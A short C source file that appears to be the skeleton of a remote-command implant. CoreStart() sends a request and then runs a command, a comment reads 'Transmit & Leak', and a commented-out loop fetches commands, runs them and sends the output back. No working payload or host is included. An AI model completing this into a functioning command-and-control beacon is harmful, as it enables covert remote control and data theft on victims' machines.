#include "core.h"


void CoreStart() {
	LPSTR outputBuffer = NULL;
	/* Initialize configuration*/
	/* Initialize logger*/

	// Transmit & Leak, TODO: POSTDATA, Transmission configuration, command pointer
	SendRequest(outputBuffer);
	// while (IsCommandExist()) {
	//	runCmd(command)
	//  SendRequest(outputBuffer)
	// }
	// Process command
	runCmd(outputBuffer);
}